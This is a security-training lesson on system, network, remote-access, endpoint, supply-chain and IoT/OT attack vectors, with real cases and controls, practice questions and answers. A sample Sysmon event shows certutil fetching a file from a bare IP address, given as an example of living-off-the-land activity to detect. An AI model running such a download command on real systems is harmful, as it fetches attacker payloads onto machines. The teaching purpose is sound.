---
title: System, Network and Supply Chain Vectors
summary: The ways in through technology and partners, from browser extensions, scripts, password managers, cookies and session tokens to network devices, session keys, RDP, VNC and VPN, endpoints and living-off-the-land tools, suppliers, MSPs and SaaS providers, IoT devices and operational technology, with real cases and the controls that close each path (SY0-801 objective 2.3).
minutes: 35
objectives:
  - Explain how browser extensions, scripts, cookies and session tokens become attack vectors
  - Identify exposed remote access, IoT and OT services in a scan and say why each is dangerous
  - Recognize living-off-the-land activity in a process-creation event
  - Describe supply chain vectors (third parties, MSPs, logistics, SaaS) with real cases and controls
---

## Outline

1. Browser-based vectors
2. Network-based vectors
3. Remote access
4. Endpoint-based vectors and living off the land
5. Supply chain vectors
6. IoT and OT

## Browser-based vectors

The browser is where most work happens, so it holds most of what an attacker wants.

- **Extensions** run inside every page they are allowed to see. This Manifest V3 extension can
  read every cookie for every site:

```json
{
  "manifest_version": 3,
  "name": "PDF Quick Convert",
  "version": "4.2.1",
  "permissions": ["cookies", "scripting", "storage", "webRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "bg.js"}
}
```

  A trusted extension can turn hostile through an update: in December 2024 attackers phished the
  Chrome Web Store account of the security company Cyberhaven and published a version that stole
  cookies and session tokens from users whose browsers updated automatically. Control: an
  allow list of approved extensions, enforced by policy.
- **JavaScript** from third parties (analytics, chat widgets, payment scripts) runs with your
  site's authority; a compromised script can skim card numbers from checkout pages. Use
  Subresource Integrity hashes and a Content Security Policy.
- **Password managers** are a strong defense, but the vault and the browser's saved passwords are
  prime loot for information-stealing malware ("infostealers"). Protect the vault with MFA and do
  not let browsers save corporate passwords outside it.
- **Cookies and session tokens**: after login, a session cookie *is* the login. Stealing it
  (ATT&CK T1539) and replaying it (T1550.004) skips the password and the MFA. ATT&CK lists
  infostealers such as RedLine and Lumma among the malware that harvests them. Short sessions,
  binding tokens to the device, and re-authentication for sensitive actions limit the damage.

## Network-based vectors

- **Infrastructure devices**: routers, firewalls and VPN gateways sit on the edge, run old
  firmware and rarely carry endpoint protection. State actors such as Volt Typhoon (previous
  lesson) gained initial access by exploiting them.
- **Virtualized devices**: virtual firewalls, load balancers and the hypervisor management
  interface. One compromised hypervisor console reaches every virtual machine behind it.
- **Session keys**: the symmetric keys that protect a TLS or VPN session. An attacker who
  obtains them, from memory or through a weak key exchange, can decrypt or hijack the session.
  Forward secrecy and current protocol versions (Security Foundations) are the defense.

## Remote access

Remote desktop (**RDP**, port 3389), **VNC** (Virtual Network Computing, port 5900) and **VPN**
gateways are designed to give full access from afar, which is exactly what attackers want
(ATT&CK T1133, External Remote Services). At Colonial Pipeline in 2021, the chief executive told
the US Senate that the attackers entered through a legacy VPN account protected only by a
password, a VPN the IT team did not know about because it did not appear in their scans. A scan
of your own address range from outside finds such doors before attackers do. This grepable
`nmap` output covers a small public range:

```text
Host: 198.51.100.2 (vpn.ferries.example)	Ports: 443/open/tcp//https///	Ignored State: filtered (7)
Host: 198.51.100.5 ()	Ports: 22/open/tcp//ssh///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (6)
Host: 198.51.100.7 ()	Ports: 554/open/tcp//rtsp///, 23/open/tcp//telnet///	Ignored State: filtered (6)
Host: 198.51.100.9 ()	Ports: 5900/open/tcp//vnc///, 502/open/tcp//mbap///	Ignored State: filtered (6)
Host: 198.51.100.12 ()	Ports: 9100/open/tcp//jetdirect///, 443/closed/tcp//https///	Ignored State: filtered (6)
```

```bash
# Services that should never face the internet, by port.
declare -A risky=([23]="Telnet" [502]="Modbus (OT)" [554]="RTSP camera" [3389]="RDP" [5900]="VNC" [9100]="raw printing")
grep '^Host:.*Ports:' edge.gnmap | while IFS=$'\t' read -r host ports _; do
  ip=${host#Host: }; ip=${ip%% *}
  for entry in ${ports#Ports: }; do
    IFS=/ read -r port state _ <<< "${entry%,}"
    if [[ $state == open && -n ${risky[$port]:-} ]]; then echo "$ip $port ${risky[$port]}"; fi
  done
done
```

```text
198.51.100.5 3389 RDP
198.51.100.7 554 RTSP camera
198.51.100.7 23 Telnet
198.51.100.9 5900 VNC
198.51.100.9 502 Modbus (OT)
198.51.100.12 9100 raw printing
```

Only the VPN on 443 belongs there. Remote access goes behind a VPN or a zero-trust access
service with phishing-resistant MFA; nothing else in that list should be reachable at all.

## Endpoint-based vectors and living off the land

**Mobile devices** and **tablets** travel, join any Wi-Fi and run personal apps; **workstations**
receive the mail and the browsing; **servers** hold data and service accounts. **Trusted
devices**, the ones conditional access lets in because they are managed and compliant, are worth
the most to steal: an attacker on one inherits its trust.

Attackers prefer the **built-in tools** already on those machines, PowerShell, WMI, `certutil`,
`mshta`, `rundll32`, because they are signed by the vendor and allowed everywhere. This is
**living off the land**, and the LOLBAS project catalogs the Windows binaries that can be abused.
`certutil` exists to manage certificates, but it can also download and decode files:

```text
Sysmon EventID 1 (Process creation)  ws-114.corp.example  2026-10-02 14:07:55.210
Image:             C:\Windows\System32\certutil.exe
CommandLine:       certutil.exe -urlcache -f http://198.51.100.40/upd.txt C:\Users\Public\upd.txt
ParentImage:       C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /c "C:\Users\priya.shah\Downloads\invoice-0412.cmd"
User:              CORP\priya.shah
```

A user's account, a script from Downloads, and a certificate tool fetching a text file from a bare
IP address: every part is legitimate on its own, and together they are an intrusion. Detection is
behavioral (unusual parent and child processes, tools used outside their purpose), and
application control can block tools ordinary users never need.

## Supply chain vectors

You inherit the security of everyone you depend on.

- **Software and third-party providers**: in 2020 attackers inserted the SUNBURST backdoor into
  SolarWinds Orion updates, which shipped signed with SolarWinds' own certificate (CISA advisory
  AA20-352A); the US later attributed it to Russia's foreign intelligence service.
- **Managed service providers (MSPs)** hold administrator access to many customers at once. In
  July 2021 a REvil ransomware affiliate exploited Kaseya VSA, the remote-management software
  many MSPs use, and pushed ransomware through it to the providers' customers.
- **Logistics providers**: carriers, warehouses and freight systems connect to your ordering
  systems and handle your hardware, where tampering or fraudulent delivery changes can occur.
- **SaaS providers**: in 2024 Mandiant traced data theft from about 165 organizations' Snowflake
  instances to stolen customer credentials, some years old, on accounts without MFA or network
  allow lists. The provider was not breached; its customers' configuration was the vector.

Controls: vendor assessments and contracts with security terms, least-privilege and monitored
vendor access, MFA required for every SaaS account, software bills of materials (SBOMs), signed
and verified updates, and staged rollouts.

## IoT and OT

**Internet of Things (IoT)** devices, such as **cameras**, **sensors** and **printers**, ship with
default passwords, seldom get updates and are rarely monitored. In 2016 the Mirai botnet
infected cameras, video recorders and routers using a list of 62 default credentials over
Telnet, and launched record denial-of-service attacks (CISA alert, October 2016). Printers keep
copies of documents and often run old network services.

**Operational technology (OT)** controls physical processes: programmable logic controllers
(PLCs), human-machine interfaces (HMIs), protocols such as Modbus that have no authentication.
CISA's May 2025 fact sheet on OT puts removing OT from the public internet first, followed by
changing default passwords, securing remote access, segmenting OT from IT, and being able to run
the process manually.

## Common mistakes

- Approving browser extensions once and never again, although each update can change them.
- Exposing RDP or VNC "temporarily" for a vendor, and forgetting it.
- Treating a signed, built-in tool as harmless because it is signed.
- Assessing a supplier at signing and never after, or letting it keep standing admin access.

## Practice

1. Users report logins to the CRM from abroad although their MFA was never prompted. What vector
   explains it?
2. Your scan shows TCP 5900 open on a building management PC. Name the service and the fix.
3. In the `certutil` event above, which two fields make it suspicious?
4. A SaaS provider says it was not breached, yet your data was stolen from your tenant. What
   probably failed?

### Answers

1. Stolen session cookies or tokens (for example from an infostealer or a malicious extension)
   replayed from another location: the session was already authenticated.
2. VNC. Remove it from the internet; put remote access behind a VPN or access broker with MFA and
   a strong VNC password, and log sessions.
3. The command line (`-urlcache -f` downloading from a bare IP) and the parent (a `.cmd` file run
   from Downloads).
4. Your side of the shared responsibility: weak or stolen credentials without MFA, or no network
   allow list.

## Key takeaways

- Extensions, third-party scripts, saved passwords and session cookies are browser vectors.
- Edge devices, hypervisors and session keys are network vectors; RDP, VNC and VPN must never be
  exposed without strong MFA.
- Living off the land abuses signed tools; detect behavior, not files.
- Suppliers, MSPs, logistics and SaaS providers extend your attack surface; IoT and OT add devices
  that cannot defend themselves.

## Further reading

- [CISA advisory AA20-352A: APT compromise of government agencies (SolarWinds)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a)
- [Google Cloud (Mandiant): UNC5537 targets Snowflake customer instances](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion)
- [MITRE ATT&CK: Steal Web Session Cookie (T1539)](https://attack.mitre.org/techniques/T1539/)
- [LOLBAS: Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
